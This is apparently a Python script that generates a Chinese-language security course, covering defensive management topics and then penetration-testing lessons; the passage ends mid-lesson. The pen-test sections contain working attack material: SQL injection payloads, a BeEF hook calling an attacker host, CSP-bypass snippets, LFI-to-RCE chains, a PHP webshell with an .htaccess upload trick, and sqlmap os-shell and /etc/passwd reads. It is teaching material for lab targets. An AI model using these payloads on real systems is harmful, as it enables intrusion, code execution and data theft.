     [S('一、风险评估模型','一风险评估模型',r"""## 一、风险评估公式
```
风险值 = 资产价值 × 威胁可能性 × 脆弱性严重程度
           │            │              │
      CIA赋值1-5    发生概率1-5    漏洞等级1-5
```
### 风险处置策略
| 策略 | 含义 | 示例 |
|:---|:---|:---|
| **风险规避** | 停止高风险活动 | 停用存在0day的老旧系统 |
| **风险转移** | 通过保险/外包转移 | 购买网络安全保险 |
| **风险缓解** | 降低可能性或影响 | 部署WAF降低SQLi风险 |
| **风险接受** | 知情下接受剩余风险 | 低风险→成本高于损失 |
### 风险评估流程
```
资产识别 → 威胁识别 → 脆弱性识别 → 已有措施确认
    → 风险计算 → 风险评价 → 风险处置 → 残余风险评估
```""")],[('风险计算公式','⭐⭐⭐⭐⭐','中','风险=资产价值×威胁×脆弱性'),('四策略','⭐⭐⭐⭐⭐','低','规避/转移/缓解/接受')],[('风险','"风险不是最坏的场景——是可能性×损失的乘积"','',)],[('风险=威胁','威胁是"可能发生的坏事"；风险是"坏事发生的概率×影响"。没有脆弱性→威胁无法造成风险。')],['对你管理的系统做一次风险评估(资产→威胁→脆弱性→风险计算)。'],'风险评估不是吓人——是理性地告诉你"什么值得优先保护"。',
    ),
    (25, '灾难恢复与业务连续性', '中级', '35',
     'BCP(业务连续性计划)和DRP(灾难恢复计划)是安全管理的顶层设计。本章详解BIA(业务影响分析)、RTO/RPO、容灾架构(热备/温备/冷备)、恢复策略和演练测试方法。',
     [S('一、BCP/DRP核心概念','一bcpdrp核心概念',r"""## 一、关键指标
| 指标 | 全称 | 含义 | 典型值 |
|:---|:---|:---|:---:|
| **RTO** | Recovery Time Objective | 恢复时间目标 | 4小时 |
| **RPO** | Recovery Point Objective | 恢复点目标(数据丢失) | 15分钟 |
| **MTPD** | Max Tolerable Period of Disruption | 最大可容忍中断时间 | 24小时 |
### 容灾架构
| 类型 | 设备 | 数据同步 | 恢复时间 | 成本 |
|:---|:---|:---|:---:|:---:|
| **热备** | 运行中 | 实时同步 | 分钟级 | 最高 |
| **温备** | 待启动 | 定期同步 | 小时级 | 中等 |
| **冷备** | 无设备 | 离线备份 | 天级 | 最低 |
### BIA(业务影响分析)
```
步骤:
1. 识别关键业务功能
2. 确定每个功能可容忍的最大中断时间(MTPD)
3. 确定RTO和RPO
4. 评估中断的财务/声誉/合规影响
```""")],[('RTO vs RPO','⭐⭐⭐⭐⭐','低','RTO=恢复时间目标/RPO=恢复点目标(允许丢多少数据)'),('BIA','⭐⭐⭐⭐','中','业务影响分析→确定RTO/RPO的基础')],[('容灾','"RTO几时恢复-RPO丢多少-热备最快也最贵"','',)],[('有备份就有容灾','备份≠容灾。容灾包含完整的恢复流程、人员分工和定期演练。大多数备份在恢复测试时发现不可用。')],['设计你系统的BCP/DRP文档(确定RTO/RPO)。'],'灾难恢复计划的价值在灾难来临时才体现——但准备必须现在开始。',
    ),
    # Day 26-30
    (26, '安全策略与制度', '中级', '30',
     '安全策略是安全管理的纲领性文件。本章详解安全策略体系(方针→标准→规程→指南)、可接受使用策略(AUP)、密码策略、访问控制策略、数据分类策略和策略生命周期管理。',
     [S('一、策略体系','一策略体系',r"""## 一、安全策略四层金字塔
```
顶层: 安全方针(Policy)    — "必须做什么"
二层: 安全标准(Standard)   — "必须达到什么标准"
三层: 安全规程(Procedure)  — "具体怎么做"
底层: 安全指南(Guideline)  — "建议怎么做"
```
### 核心安全策略清单
| 策略 | 内容 | 关键要素 |
|:---|:---|:---|
| 密码策略 | 复杂度/长度/过期 | 最少14位/MFA强制 |
| AUP | 可接受使用 | 禁止非授权软件 |
| 访问控制 | 权限申请/审批/回收 | 最小权限+定期审查 |
| 数据分类 | 公开/内部/机密/绝密 | 每类对应保护措施 |
| 远程办公 | VPN/加密/终端 | MFA强制+公司设备 |""")],[('四层策略','⭐⭐⭐⭐','中','方针→标准→规程→指南'),('AUP','⭐⭐⭐','低','可接受使用策略；定义用户行为规范')],[('安全策略','"从策略到执行——策略是目的，规程是实现"','',)],[('有策略文档就合规','策略落地靠执行——未执行的策略只是摆设。审计员看的是执行证据而非文档本身。')],['为你团队编写一份安全策略框架。'],'安全策略不是"写了就锁进抽屉"——是"每个人都理解并遵守的活文档"。',
    ),
    (27, '安全意识培训', '中级', '30',
     '人是安全最薄弱的环节——95%的安全事件涉及人为因素。本章详解安全意识培训体系设计(入职/定期/专项)、钓鱼邮件演练、社会工程学防御、BYOD安全培训和安全文化培育。',
     [S('一、培训体系','一培训体系',r"""## 一、安全意识培训体系
| 类型 | 频率 | 对象 | 内容 |
|:---|:---|:---|:---|
| 入职培训 | 入职时 | 新员工 | 基本安全要求 |
| 定期培训 | 每季/每年 | 全员 | 最新威胁+防御 |
| 钓鱼演练 | 每月 | 全员 | 模拟钓鱼邮件+反馈 |
| 专项培训 | 按需 | 开发/运维 | 安全编码/配置 |
| 通报 | 即时 | 全员 | 新攻击手法提醒 |
### 钓鱼演练最佳实践
```text
1. 制作逼真的钓鱼邮件(不要太过假)
2. 追踪点击率/输入凭据率
3. 对点击者进行即时培训(而非惩罚)
4. 逐步提高钓鱼难度
5. 公布统计(匿名)→激发安全意识
工具: GoPhish(开源) / KnowBe4(商业)
```""")],[('培训四要素','⭐⭐⭐⭐','中','入职+定期+专项+通报'),('钓鱼演练','⭐⭐⭐⭐','中','模拟→度量→培训→改进循环')],[('安全意识','"把人从最弱环节变成最强防线"','',)],[('做几次培训就够了','安全意识需要持续强化——一次性培训的效果通常不超过3个月。')],['使用GoPhish搭建一次钓鱼邮件演练。'],'最贵的防火墙也挡不住一个点击了钓鱼链接的员工——安全意识培训是ROI最高的安全投入。',
    ),
    (28, '红蓝对抗', '高级', '35',
     '红蓝对抗是最接近真实攻击的安全测试形式。本章详解红队攻击链(C2/横向移动/权限维持)、蓝队检测策略(SIEM规则/威胁狩猎/IOC提取)、紫队协作(Kill Chain对照分析)和对抗演练规划设计。',
     [S('一、红蓝对抗框架','一红蓝对抗框架',r"""## 一、红蓝紫队分工
| 角色 | 职责 | 目标 | 输出 |
|:---|:---|:---|:---|
| **红队** | 模拟真实APT攻击 | 突破防御达成目标 | 攻击路径报告 |
| **蓝队** | 检测和响应攻击 | 发现攻击并遏制 | 检测覆盖率报告 |
| **紫队** | 协调+分析+改进 | 最大化演练价值 | 改进建议 |
### ATT&CK 红蓝对照分析
```
红队使用T1059(PowerShell执行) → 蓝队检查EventID 4688+PowerShell日志
红队使用T1003(凭据Dump) → 蓝队监控LSASS访问+Sysmon EventID 10
红队使用T1021(远程服务) → 蓝队监控SMB/WMI/WinRM异常连接
```
### 演练设计
1. 明确ROE(交战规则)——哪些不能碰
2. 设定Crown Jewels——红队最终目标
3. 建立沟通通道——紫队作为桥梁
4. 每日站会——同步进展不互相干扰""")],[('红蓝对抗价值','⭐⭐⭐⭐⭐','中','最接近真实攻击的安全测试形式'),('ATT&CK对照','⭐⭐⭐⭐','高','ATT&CK技术ID作为红蓝通用语言')],[('红蓝对抗','"红队攻、蓝队守、紫队教——三者各司其职"','',)],[('红蓝对抗就是渗透测试','渗透测试以发现漏洞为目标；红蓝对抗以测试防御体系为目标。红队不会报告所有漏洞——只利用那些能达成目标的。')],['组织一次小规模红蓝对抗演练(哪怕只测1-2个ATT&CK技术)。'],'红蓝对抗不是为了比"谁赢"——而是为了发现"蓝队的检测盲区在哪里"。',
    ),
    (29, '威胁情报收集', '中高级', '35',
     '威胁情报(Threat Intelligence)让防御从被动变主动。本章详解威胁情报生命周期(规划→收集→处理→分析→分发→反馈)、情报源(OSINT/MISP/ISAC)、STIX/TAXII标准、Pyramid of Pain和ATT&CK情报映射。',
     [S('一、Pyramid of Pain','一pyramid-of-pain',r"""## 一、痛苦金字塔
```
          ┌───────────┐  更难改变，更高价值
          │   TTPs     │  战术/技术/过程
          ├───────────┤  攻击模式(如:鱼叉→投递→执行→持久化)
          │   Tools    │  Cobalt Strike/Mimikatz
          ├───────────┤
          │ Network Artifacts│ URI Patterns/C2通信特征
          ├───────────┤
          │ Domain Names│ C2域名(DGA)
          ├───────────┤
          │ IP Addresses│ C2 IP
          ├───────────┤
          │ Hash Values │ 文件MD5/SHA256
          └───────────┘  最容易改变，价值最低
```
### 情报收集源
| 类型 | 来源 | 成本 |
|:---|:---|:---:|
| OSINT | Twitter/论坛/GitHub | 免费 |
| 商业 | Recorded Future/CrowdStrike/微步在线 | 付费 |
| 社区 | MISP/OTX/ISAC | 免费/会员 |
| 内部 | SIEM/EDR/Honeypot | 自建 |""")],[('Pyramid of Pain','⭐⭐⭐⭐⭐','高','Hash→IP→Domain→Network→Tools→TTPs'),('STIX/TAXII','⭐⭐⭐⭐','中','威胁情报标准化共享格式/传输协议')],[('威胁情报','"情报不是黑名单——是从Hash到TTP的六层金字塔"','',)],[('威胁情报就是IOC列表','高质量的威胁情报包括攻击者画像(TTPs)、攻击动机和横向移动模式，远不止IOC。')],['搭建MISP威胁情报平台并接入OTX免费情报源。'],'威胁情报的核心不是"收集了多少IOC"——是"这些IOC对你的组织有多大威胁"。',
    ),
    (30, '安全运营体系建设', '高级', '30',
     '总结篇——将SOC/SIEM/IDS/IR/漏洞管理/威胁情报/等保等融为一个完整的安全运营体系。本章站在架构高度审视各组件如何协同、安全运营度量体系建设和持续改进循环(PDCA)。',
     [S('一、运营体系全景','一运营体系全景',r"""## 一、安全运营全景图
```
              ┌─────────────┐
              │   安全策略    │ ← 顶层指导(等保/ISO27001)
              └──────┬──────┘
    ┌────────┬───────┼───────┬────────┐
    ▼        ▼       ▼       ▼        ▼
 资产管理  威胁检测  事件响应  漏洞管理  合规审计
    │        │       │       │        │
    ▼        ▼       ▼       ▼        ▼
 CMDB    SIEM+IDS  PDCERF   扫描+补丁  测评
    └────────┴───────┼───────┴────────┘
                     ▼
              ┌─────────────┐
              │  持续改进     │ ← PDCA循环
              └─────────────┘
```
### 安全运营度量体系
```text
效率指标: MTTD/MTTR/告警处理量
效果指标: 事件遏制率/安全事件下降率
覆盖指标: 资产覆盖率/日志覆盖率/检测覆盖率
合规指标: 漏洞修复SLA/策略合规率
```
### PDCA 持续改进
Plan(计划)→ Do(执行)→ Check(检查)→ Act(改进)→ 循环上升""")],[('安全运营体系','⭐⭐⭐⭐⭐','高','策略→检测→响应→修复→审计→改进闭环'),('PDCA','⭐⭐⭐⭐','中','Plan-Do-Check-Act持续改进循环')],[('运营体系','"策略定方向，检测做眼睛，响应做手脚，修复治病根，审计做体检，度量看效果"','',)],[('买了所有工具就是安全运营','安全运营的核心不是工具——是"人+流程+数据"如何协同产生安全价值。')],['绘制你组织的安全运营全景图，分析各组件间的协同效率。'],'安全运营不是一堆工具的堆砌——它是一个有机整体，任何一个环节脱节都会让整条防线失效。三十天防御之旅，你从"实施者"变成了"设计者"。',
    ),
]

# Generate defense days
print("\n=== GENERATING DEFENSE Day 5-30 ===")
for d in defense_days:
    make_day('defense', *d)
    print(f"  [DEFENSE] Day {d[0]} done")
    sys.stdout.flush()

print(f"\n=== DEFENSE COMPLETE ===")

# ───────────────── PENETRATION Day 1-30 ─────────────────
pen_days = [
    (1, '渗透测试概述', '入门', '35',
     '渗透测试是通过模拟黑客攻击评估系统安全性的授权活动。本章详解渗透测试定义/分类/流程/法律边界、PTES标准、红蓝紫队分工和信息收集方法论。',
     [S('一、渗透测试基础','一渗透测试基础',r"""## 一、渗透测试定义
渗透测试=授权+模拟+深度验证+风险可控。与漏洞扫描的本质区别：

| 维度 | 渗透测试 | 漏洞扫描 |
|:---|:---|:---|
| 执行方式 | 人工主导+工具辅助 | 自动化 |
| 深度 | 验证漏洞可利用率 | 报告潜在漏洞 |
| 误报率 | 低(人工确认) | 较高 |
| 典型工具 | Burp/Metasploit/C2 | Nessus/OpenVAS |
### 渗透测试分类
| 类型 | 信息量 | 模拟攻击者 |
|:---|:---|:---|
| 黑盒 | 零信息 | 外部攻击者 |
| 灰盒 | 部分信息(账号) | 内部普通用户 |
| 白盒 | 全部信息(代码/架构) | 内部安全审计 |""")],[('渗透测试三要素','⭐⭐⭐⭐⭐','低','授权+模拟攻击+深度验证'),('黑盒/灰盒/白盒','⭐⭐⭐⭐','低','零信息→部分信息→全部信息')],[('渗透','"攻击是破坏，渗透是授权评估——一线之隔天壤之别"','',)],[('渗透测试就是黑客攻击','渗透测试有授权/范围/时间限定且最终交付修复建议。未经授权的渗透=非法入侵。')],['了解PTES渗透测试执行标准。'],'渗透测试不是"随便黑一下"——它是一套严谨方法论。',
    ),
    (2, '被动信息收集', '中级', '35',
     '被动信息收集(OSINT)在目标不感知的情况下收集情报。本章详解Google Hacking/dork/Shodan/Censys/WHOIS/DNS/社会媒体/代码仓库(GitHub)信息收集。',
     [S('一、Google Hacking','一google-hacking',r"""## 一、Google Dork 实战
| 操作符 | 功能 | 示例 |
|:---|:---|:---|
| site: | 限定站点 | site:target.com |
| filetype: | 限定文件类型 | filetype:pdf confidential |
| intitle: | 标题包含 | intitle:"index of" |
| inurl: | URL包含 | inurl:admin login |
| - | 排除 | site:target.com -www |
```
site:target.com filetype:sql  (泄露数据库备份)
site:target.com intitle:"index of" (目录遍历)
site:github.com "target.com" password (代码泄露)
```
### Shodan/Censys/Fofa
```bash
# Shodan CLI
shodan search "nginx country:CN"
shodan host 1.2.3.4
# Fofa(国内)
fofa search 'app="Tomcat" && country="CN"'
```"""),S('二、DNS/WHOIS','二dnswhois',r"""## 二、DNS/WHOIS信息收集
```bash
# WHOIS
whois target.com
# DNS枚举
dig target.com ANY
dig axfr @ns1.target.com target.com  # 域传送漏洞
dnsrecon -d target.com -t axfr
# 子域名发现
subfinder -d target.com
amass enum -d target.com
# 证书透明度(CT)日志
curl "https://crt.sh/?q=%25.target.com&output=json"
```""")],[('被动vs主动','⭐⭐⭐⭐⭐','中','被动=不接触目标/主动=直接交互'),('Google Dork','⭐⭐⭐⭐','中','site/filetype/intitle/inurl操作符')],[('OSINT','"被动收集三件套：Google搜、Shodan扫、DNS查"','',)],[('被动收集无风险','虽然不与目标直接交互，但访问Shodan/WHOIS等第三方也可能留下记录。')],['对testfire.net完成一次完整OSINT信息收集。'],'信息收集占渗透测试60%时间——知道的越多，攻击面越大。',
    ),
    (3, 'DNS信息收集', '中级', '30',
     'DNS是信息收集的富矿。本章详解DNS记录类型(A/MX/NS/TXT/CNAME/SOA)、域传送漏洞、子域名爆破、DNS反向解析、DNSSEC分析和DNS历史数据(DNSDB/SecurityTrails)。',
     [S('一、子域名枚举','一子域名枚举',r"""## 一、子域名发现方法论
```bash
# 字典爆破
gobuster dns -d target.com -w subdomains.txt
ffuf -u http://FUZZ.target.com -w subdomains.txt

# 证书透明度
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value'

# 搜索引擎
site:*.target.com -www
# DNS域传送漏洞
dig axfr @dns-server target.com
# 工具整合
subfinder -d target.com | httpx -title -status-code
```""")],[('DNS记录类型','⭐⭐⭐⭐','中','A/MX/NS/TXT/CNAME/SOA/PTR'),('域传送漏洞','⭐⭐⭐⭐','中','dig axfr获取全部DNS记录')],[('DNS信息','"子域名是攻击者的金矿——每个子域名都可能是一个新攻击面"','',)],[('子域名扫描无风险','大量DNS查询可能被目标DNS服务器检测到(主动收集)。')],['使用Amass对目标域名进行完整子域名枚举。'],'子域名往往运行着被遗忘的旧系统——攻击者的天堂。',
    ),
    (4, 'Nmap主机扫描', '中级', '40',
     'Nmap是渗透测试第一工具。本章详解Nmap主机发现(-sn/-PS/-PA)、端口扫描技术(SYN/Connect/ACK/FIN/NULL/Xmas)、服务版本探测(-sV)、OS检测(-O)和NSE脚本引擎。',
     [S('一、扫描技术矩阵','一扫描技术矩阵',r"""## 一、Nmap扫描技术全解
| 扫描 | 参数 | 原理 | 隐蔽性 |
|:---|:---|:---|:---:|
| SYN | -sS | 半开放扫描 | ⭐⭐⭐ |
| Connect | -sT | 完整TCP连接 | ⭐ |
| ACK | -sA | 测试防火墙规则 | ⭐⭐⭐ |
| FIN | -sF | 仅FIN标志 | ⭐⭐⭐⭐ |
| NULL | -sN | 无标志 | ⭐⭐⭐⭐ |
| Xmas | -sX | FIN/URG/PSH | ⭐⭐⭐⭐ |
| UDP | -sU | UDP端口探测 | ⭐⭐⭐ |
```bash
# 常用扫描组合
nmap -sS -sV -p- -T4 target  # SYN+版本+全端口+快速
nmap -sS --top-ports 1000 target  # Top1000端口
nmap -A -T4 target  # 全面扫描(OS+版本+NSE+路由)
# NSE脚本
nmap --script vuln target  # 漏洞扫描
nmap --script http-enum target  # Web目录枚举
```""")],[('11种扫描','⭐⭐⭐⭐⭐','中','SYN/Connect/ACK/FIN/NULL/Xmas/UDP/SCTP/IP Protocol/Idle/FTP Bounce')],[('扫描','"SYN半开是主力，UDP慢得要命，FIN能绕过简单防火墙"','',)],[('端口扫描等于攻击','未经授权的端口扫描在中国属于违法行为。授权渗透测试中需在授权范围内进行。')],['在靶机上进行完整的Nmap端口扫描练习。'],'端口扫描是进入目标的"敲门砖"——知道哪些门开着，才知道往哪走。',
    ),
    (5, 'Nmap高级扫描', '中高级', '35',
     'Nmap进阶技巧：扫描规避(分片/诱饵/MAC欺骗)、NSE脚本开发(Lua)、Ndiff扫描结果对比、大规模扫描(Masscan+Zmap)和输出格式转换(转Metasploit输入)。',
     [S('一、扫描规避','一扫���规避',r"""## 一、Nmap规避技术
```bash
-f                # 分片扫描(绕过简单防火墙)
--mtu 24          # 指定MTU
-D RND:5          # 诱饵扫描(5个假IP)
--source-port 53  # 伪装源端口(DNS)
--data-length 100 # 添加随机数据
-T1               # 慢扫描模板
--randomize-hosts # 随机顺序
```
### Masscan快速发现
```bash
masscan -p1-65535 10.0.0.0/8 --rate=100000  # 6分钟扫完全互联网!
# 组合: Masscan快速发现+Nmap深度扫描
```""")],[('规避技术','⭐⭐⭐⭐','高','分片/诱饵/源端口/慢速/随机'),('Masscan','⭐⭐⭐⭐','中','异步高速扫描；配合Nmap使用')],[('规避','"快扫用Masscan，深扫用Nmap，隐蔽用T1+f+D"','',)],[('Nmap扫描不会被发现','任何主动扫描都可能被IDS/防火墙检测到。T0/T1降低但无法消除被检测可能。')],['对比同一目标SYN和Connect扫描结果的差异。'],'规避的终极境界是不被感知——但技术只是手段，速度才是你的朋友。',
    ),
    # Day 6-10
    (6, 'Web目录扫描', '中级', '35',
     'Web目录扫描发现隐藏的管理后台、备份文件、配置文件——这些往往是渗透的突破口。本章详解Gobuster/Dirb/Dirbuster/ffuf实战、字典选择策略和递归扫描。',
     [S('一、目录扫描实战','一目录扫描实战',r"""## 一、工具对比
| 工具 | 语言 | 速度 | 特点 |
|:---|:---|:---:|:---|
| gobuster | Go | ⭐⭐⭐⭐⭐ | 最快，多模式 |
| ffuf | Go | ⭐⭐⭐⭐⭐ | 最灵活，支持模糊 |
| dirsearch | Python | ⭐⭐⭐⭐ | Python生态好 |
| feroxbuster | Rust | ⭐⭐⭐⭐⭐ | 递归递归 |
```bash
# Gobuster
gobuster dir -u http://target -w wordlist.txt -x php,asp,aspx,jsp
gobuster vhost -u http://target -w vhosts.txt

# ffuf(递归)
ffuf -u http://target/FUZZ -w wordlist.txt -recursion -recursion-depth 3

# 自定义过滤(排除404/403)
ffuf -u http://target/FUZZ -w wordlist.txt -fc 404,403
```""")],[('目录扫描','⭐⭐⭐⭐','中','Gobuster/ffuf/dirsearch三大工具'),('字典','⭐⭐⭐⭐','中','SecLists/raft/自定义字典')],[('目录','"隐藏的管理后台=攻击者的大门"','',)],[('扫出403就是没权限','403可能只拒绝GET方法——换POST/PUT/OPTIONS可能绕过。')],['用gobuster对靶机进行完整目录扫描。'],'Web目录扫描是"淘金"——几千个404里可能藏着那一个/admin。',
    ),
    (7, '社工信息收集', '中级', '30',
     '社会工程学利用人性弱点——而信息收集是社工的第一步。本章详���Harvester/theHarvester/Maltego/Recon-ng、社交媒体挖掘(LinkedIn/Twitter)、邮件格式推导和钓鱼信息准备。',
     [S('一、社工工具','一社工工具',r"""## 一、theHarvester
```bash
theHarvester -d target.com -b google,linkedin,github,shodan
# Maltego CE(社区版)
# 图形化关联分析: 域名→邮箱→社交账号→公司信息
# Recon-ng
recon-ng
> marketplace install discovery/info_disclosure/cache_snoop
> modules load recon/contacts/gather/http_api/hunter
```
### LinkedIn信息收集
- 员工姓名→邮件格式(john.doe@target.com)
- 技术栈(招聘信息分析)
- 组织架构(谁管安全/IT)
- 内部项目名称""")],[('theHarvester','⭐⭐⭐⭐','中','一站式OSINT+社工信息收集'),('Maltego','⭐⭐⭐⭐','中','图形化关联分析')],[('社工','"信息越多，社工越真——你收集的每一条信息都可能成为钓鱼邮件的素材"','',)],[('社工信息收集无危害','未经授权收集他人个人信息(邮箱/手机号)可能违反《个人信息保护法》。')],['用theHarvester对testfire.net做一次信息收集。'],'最好的社工不是在邮件里放恶意链接——是用收集的信息让人相信"我是你同事"。',
    ),
    (8, 'Burp Suite核心功能', '中级', '40',
     'Burp Suite是Web渗透测试的核心平台。本章详解Proxy(拦截/修改)、Repeater(重放)、Intruder(暴力破解/Fuzzing)、Scanner(自动扫描)、Decoder/Comparer和Burp Extensions(BApp Store)实战。',
     [S('一、Proxy与Repeater','一proxy与repeater',r"""## 一、Burp四大核心模块
| 模块 | 功能 | 关键操作 |
|:---|:---|:---|
| **Proxy** | HTTP/S流量拦截 | Intercept开关+HTTP History |
| **Repeater** | 手动重复发送 | 修改→发送→分析响应→再修改 |
| **Intruder** | 自动化批量测试 | 4种攻击模式(Sniper/Battering/Pitchfork/Cluster) |
| **Scanner** | 自动漏洞扫描 | Active/Passive扫描(Pro版) |
```text
Repeater实战技巧:
1. Ctrl+R: 从Proxy History发送到Repeater
2. 修改参数/Header/Body→发送→观察响应
3. 添加/删除参数→测试404→可能发现隐藏功能
4. 修改Content-Type→测试数据解析差异
```
### Intruder攻击模式
| 模式 | 说明 | 场景 |
|:---|:---|:---|
| Sniper | 单参数逐个测试 | 密码爆破 |
| Battering Ram | 多参数相同Payload | 多参数同值测试 |
| Pitchfork | 多参数对应测试 | user+pass配对 |
| Cluster Bomb | 多参数全排列 | 参数组合Fuzzing |"""),S('二、BApp Store','二bapp-store',r"""## 二、Burp Extensions推荐
| 插件 | 功能 |
|:---|:---|
| Autorize | 自动化越权检测 |
| Turbo Intruder | 高速并发Intruder |
| Hackvertor | 编码/加密/转换 |
| SQLiPy | SQL注入自动化 |
| JSON Web Tokens | JWT编解码+攻击 |
| Logger++ | 高级HTTP日志 |
```""")],[('Burp四模块','⭐⭐⭐⭐⭐','中','Proxy拦截→Repeater重放→Intruder批量→Scanner扫描'),('Intruder模式','⭐⭐⭐⭐','中','Sniper/Battering/Pitchfork/Cluster Bomb')],[('Burp','"Proxy是眼睛，Repeater是手，Intruder是自动手"','',)],[('Burp Scanner能替代人工','Scanner能发现已知漏洞但无法发现业务逻辑漏洞——人工分析不可替代。')],['使用Burp Suite完成DVWA的完整渗透测试流程。'],'Burp Suite是你手里最顺手的"手术刀"——熟练使用它，Web安全的攻防就有了操作平台。',
    ),
    (9, 'SQL注入深度利用', '高级', '40',
     'SQL注入从OWASP Top10首位下降但仍是最具破坏力的Web漏洞之一。本章详解Boolean/Error/Union/Time/Stacked/Out-of-band六种注入技术、手工注入完整流程、SQLMap高级用法和真实CVE分析。',
     [S('一、六种注入技术','一六种注入技术',r"""## 一、SQLi六种类型
| 类型 | 原理 | 速度 | 可见性 |
|:---|:---|:---:|:---:|
| Union Based | UNION SELECT合并查询 | 最快 | 结果可见 |
| Error Based | 触发错误泄露数据 | 快 | 错误可见 |
| Boolean Blind | TRUE/FALSE逐位判断 | 慢 | 不可见 |
| Time Blind | SLEEP延迟判断 | 最慢 | 不可见 |
| Stacked | 多语句执行(;) | 快 | 取决于 |
| Out-of-band | DNS/HTTP带外 | 中 | 需OOB |
```sql
-- Union: ' UNION SELECT 1,table_name,3 FROM information_schema.tables --
-- Error: ' AND extractvalue(1,concat(0x7e,database())) --
-- Boolean: ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
-- Time: ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0) --
```"""),S('二、SQLMap进阶','二sqlmap进阶',r"""## 二、SQLMap实战
```bash
# 指定注入技术
sqlmap -u "target?id=1" --technique=U --level=3 --risk=2
# --technique=B(E)STUQ
# Tamper绕过
sqlmap -u "target?id=1" --tamper=space2comment,between,randomcase
# OS Shell(需要stacked+DBA+绝对路径)
sqlmap -u "target?id=1" --os-shell
# 自定义SQL查询
sqlmap -u "target?id=1" --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```""")],[('六种注入','⭐⭐⭐⭐⭐','高','Union/Error/Boolean/Time/Stacked/Out-of-band'),('Tamper绕过','⭐⭐⭐⭐','高','编码/混淆/拆分payload绕过WAF')],[('SQLi','"有回显Union,无回显Boolean,都屏蔽Time,能多条Stacked"','',)],[('SQL注入已过时','SQL注入仍是2024年最活跃的Web攻击向量之一——排名下降是因为其他风险增加而非SQLi减少。')],['在SQLi-Labs靶场中练习从Less-1到Less-65+。'],'SQL注入从被发现(1998)到现在已26年仍活跃——说明防御简单但容易被忽视。',
    ),
    (10, 'XSS深度利用', '高级', '40',
     'XSS从"弹窗"到"完整浏览器控制"——本章深入XSS利用技术(BeEF/Cookie窃取/键盘记录/内网扫描)、绕过CSP策略、DOM Clobbering、Mutation XSS和AngularJS/React模板注入。',
     [S('一、BeEF浏览器控制','一beef浏览器控制',r"""## 一、BeEF实战
```bash
# XSS Payload注入BeEF Hook
<script src="http://attacker:3000/hook.js"></script>
# 被Hook后可执行:
# - 浏览器信息收集(OS/插件/版本)
# - 社会工程(伪造登录框/Flash更新)
# - 内网扫描(识别内网服务)
# - 持久化(iframe保持连接)
```
### CSP绕过技术
```html
<!-- JSONP端点利用 -->
<script src="/api/jsonp?callback=alert(1)"></script>
<!-- AngularJS CSP绕过 -->
<div ng-app ng-csp ng-click="$event.view.alert(1)">Click</div>
<!-- DOM Clobbering -->
<form id="config"><input name="debug" value="true"></form>
<script>if(config.debug) eval(attackerCode)</script>
```""")],[('BeEF','⭐⭐⭐⭐','中','浏览器控制平台；500+功能模块'),('CSP绕过','⭐⭐⭐⭐⭐','高','JSONP端点/AngularJS/DOM Clobbering')],[('XSS利用','"弹窗只是开始——BeEF让弹窗变成远程控制"','',)],[('XSS只能在当前页面搞破坏','XSS可以创建iframe保持持久连接、扫描内网、甚至结合浏览器漏洞获取系统权限。')],['搭建BeEF环境，实践Hook→信息收集→社会工程的完整利用链。'],'XSS不是"弹窗"——它是"你的浏览器在帮我干活"。',
    ),
    (11, 'CSRF深度利用', '中高级', '30',
     'CSRF绕过深入：Token验证逻辑缺陷(Bypass/Cookie注入/可预测)、JSON CSRF、SameSite Bypass、跨子域CSRF和CSRF+XSS组合攻击。',
     [S('一、Token绕过','一token绕过',r"""## 一、CSRF Token绕过技术
| 绕过 | 技术 |
|:---|:---|
| 删除Token | 不传csrf_token参数 |
| 空Token | csrf_token= |
| 固定Token | 使用任意的非空值 |
| 复用Token | 攻击者用自己的Token |
| Switch方法 | POST→GET |
| Cookie注入 | CRLF注入设置Cookie中的Token |
```
# JSON CSRF(Content-Type绕过)
fetch('http://target/api',{method:'PUT',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"action":"delete"}'})
```""")],[('CSRF Token绕过','⭐⭐⭐⭐⭐','高','删除/空值/固定/复用/方法切换/Cookie注入')],[('CSRF','"防CSRF三道关：Token+SameSite+Re-authentication"','',)],[('SameSite=Lax就完全防CSRF','Lax仍允许GET顶级导航携带Cookie。伪造GET CSRF仍可能在某些场景生效。')],['在PortSwigger CSRF实验靶场中练习Token绕过。'],'CSRF之所以危险，是因为它在用户完全不知情的情况下"替用户做事"。',
    ),
    # Day 12-18
    (12, '文件包含漏洞', '中级', '35',
     'LFI(本地文件包含)和RFI(远程文件包含)可导致源码泄露、RCE、信息泄露。本章详解../../路径遍历绕过、伪协议利用(PHP filter/data/input/expect)、日志污染和Session文件包含。',
     [S('一、LFI利用链','一lfi利用链',r"""## 一、LFI到RCE
```php
# 漏洞: include($_GET['page']);
# 1. PHP伪协议
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain,<?php system('id');?>
?page=php://input  [POST: <?php system('id');?>]

# 2. 日志污染→LFI→RCE
# 在User-Agent中注入<?php system('id');?>
# LFI包含 /var/log/apache2/access.log

# 3. Session文件包含
# 注册用户名: <?php system('id');?>
# LFI包含 /tmp/sess_PHPSESSID
```""")],[('LFI伪协议','⭐⭐⭐⭐⭐','高','php://filter/data/input/expect/phar'),('日志污染RCE','⭐⭐⭐⭐','高','User-Agent注入PHP代码→LFI包含日志文件')],[('文件包含','"只要有include，就有RCE的可能"','',)],[('allow_url_include=Off就防RFI','仍可通过LFI+文件上传/日志污染达到RCE。防御需要全面的输入验证。')],['在DVWA中练习LFI→RFI→RCE完整利用链。'],'文件包含是PHP最具破坏力的漏洞——一行include($_GET[xxx])就能控制整个服务器。',
    ),
    (13, '文件上传绕过', '高级', '35',
     '文件上传绕过进阶：.htaccess利用、图片马制作(EXIF/GIF帧)、二次渲染绕过、条件竞争上传、PUT方法上传和解析漏洞配合(Apache多后缀/IIS/Nginx)。',
     [S('一、上传绕过进阶','一上传绕过进阶',r"""## 一、.htaccess + 图片马组合
```bash
# 1. 上传 .htaccess
AddType application/x-httpd-php .jpg
# 2. 上传图片马 shell.jpg(GIF89a;<?php system($_GET['cmd']);?>)
# 3. 访问 shell.jpg → 被Apache当成PHP执行!

# 二次渲染绕过(GIF)
# 使用工具: gif-disposition
# 将PHP代码藏在GIF帧之间(二次渲染不修改的位置)
```
### 解析漏洞配合
| 中间件 | 利用方式 |
|:---|:---|
| Apache | file.php.xxx→末位不认识→解析PHP |
